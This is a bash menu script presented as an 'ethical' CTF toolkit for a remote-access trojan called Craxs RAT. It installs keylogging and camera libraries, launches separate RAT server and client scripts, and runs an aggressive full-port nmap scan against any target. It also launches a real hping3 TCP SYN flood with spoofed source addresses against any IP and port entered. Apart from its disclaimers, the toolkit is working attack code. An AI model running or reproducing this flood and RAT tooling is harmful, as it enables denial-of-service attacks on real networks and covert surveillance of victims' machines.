#!/bin/bash

# aaayafuj Craxs RAT Access - Extended Ethical DDoS Version
# Author: Yafet Tesfahuney
# Purpose: For ethical CTF + RAT lab environments only

# Colors
GREEN="\e[32m"
RED="\e[31m"
YELLOW="\e[33m"
RESET="\e[0m"

# Banner
banner() {
    clear
    echo -e "${GREEN}"
    echo "   ___           __                     _      "
    echo "  / _ | ___ ____/ /  ___ ____ ___  ___ (_)__ _ "
    echo " / __ |/ _ \`/ _  /__/ _ \`/ _ \`/ _ \/ _ \\/ / _ \`/ "
    echo "/_/ |_/_//_/\\_,_/(_)\\_,_/\\_, /_//_/_//_/_/\\_,_/  "
    echo "                       /___/                   "
    echo -e "${RESET}"
    echo -e "${YELLOW}aaayafuj Craxs RAT | Ethical DDoS + RAT Sim Toolkit${RESET}"
    echo
}

# Dependencies
dependencies() {
    echo -e "${GREEN}[+] Installing required packages...${RESET}"
    sudo apt update
    sudo apt install -y git python3 python3-pip openssl build-essential hping3 nmap
    pip3 install Flask pyxhook pynput opencv-python cryptography
    echo -e "${GREEN}[+] Done.${RESET}"
}

# SSL Certificate Generation (optional)
gen_ssl() {
    echo -e "${YELLOW}[+] Generating self-signed SSL cert...${RESET}"
    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
    echo -e "${GREEN}[+] SSL cert created: key.pem & cert.pem${RESET}"
}

# Ethical Nmap DDoS Simulation
nmap_ddos_sim() {
    read -p "Target IP or Domain: " target
    echo -e "${RED}[!] Starting Nmap DDoS-style scan... Use responsibly!${RESET}"
    nmap -T5 -A -Pn -p- --max-rate 1000 $target
    echo -e "${GREEN}[+] Scan complete.${RESET}"
}

# Real DDoS Simulation with hping3 (CTF use only)
real_ddos_sim() {
    echo -e "${RED}[!] WARNING: Use only in CTF or local labs. This sends real flood traffic.${RESET}"
    read -p "Target IP: " target
    read -p "Target Port: " port
    read -p "Duration (in seconds): " duration
    echo -e "${YELLOW}[+] Launching TCP SYN flood via hping3...${RESET}"
    hping3 -S --flood -V -p $port $target --rand-source &
    sleep $duration
    pkill hping3
    echo -e "${GREEN}[+] DDoS simulation stopped.${RESET}"
}

# Run the RAT client/server
run_rat() {
    echo -e "${YELLOW}[+] Launch options:${RESET}"
    echo "1) Run RAT Server (rat_server.py)"
    echo "2) Run RAT Client (rat_client.py)"
    echo "3) Back to main menu"
    read -p "Choose: " rat_choice

    case $rat_choice in
        1) python3 rat_server.py ;;
        2) python3 rat_client.py ;;
        *) echo "Back to menu..." ;;
    esac
}

# Main Menu
while true; do
    banner
    echo "1) Install Dependencies"
    echo "2) Generate SSL Certificate (Optional)"
    echo "3) Launch RAT Client/Server"
    echo "4) Ethical Nmap DDoS Scan"
    echo "5) Real DDoS Simulation (Ethical Labs Only)"
    echo "0) Exit"
    echo
    read -p "Select option: " choice

    case $choice in
        1) dependencies ;;
        2) gen_ssl ;;
        3) run_rat ;;
        4) nmap_ddos_sim ;;
        5) real_ddos_sim ;;
        0) echo -e "${RED}Exiting...${RESET}"; exit ;;
        *) echo -e "${RED}Invalid choice.${RESET}"; sleep 1 ;;
    esac
done
